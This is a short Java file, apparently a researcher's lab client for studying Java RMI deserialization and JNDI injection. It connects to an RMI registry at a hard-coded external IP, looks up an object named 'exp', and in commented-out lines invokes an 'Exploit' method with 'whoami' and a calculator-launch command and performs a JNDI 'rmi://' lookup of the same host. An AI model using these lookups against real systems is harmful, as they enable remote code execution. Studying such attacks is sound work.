package com.sorry.jcoffe.Debug.RMI;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient{
    public static void main(String[] args) throws IOException, NotBoundException {
        System.out.println("RMIClient ready!");
        Registry registry = LocateRegistry.getRegistry("39.108.244.167",1099);

        //RMI自动反序列化readObject()
        Object obj = (Object) registry.lookup("exp");
        System.out.println(obj);

        //远程调用
        /*
        EXP exp = (EXP) registry.lookup("exp");
        System.out.println(exp.Exploit("whoami"));
        System.out.println(exp);
        */

        //rmi of jndi
        /*
        new InitialContext().lookup("rmi://39.108.244.167:1099/exp");
        */

        //Naming快捷方法
        /*
        EXP exp = (EXP) Naming.lookup("rmi://:1099/exp");
        exp.Exploit("open /System/Applications/Calculator.app");
        System.out.println(exp);
        */
    }
}
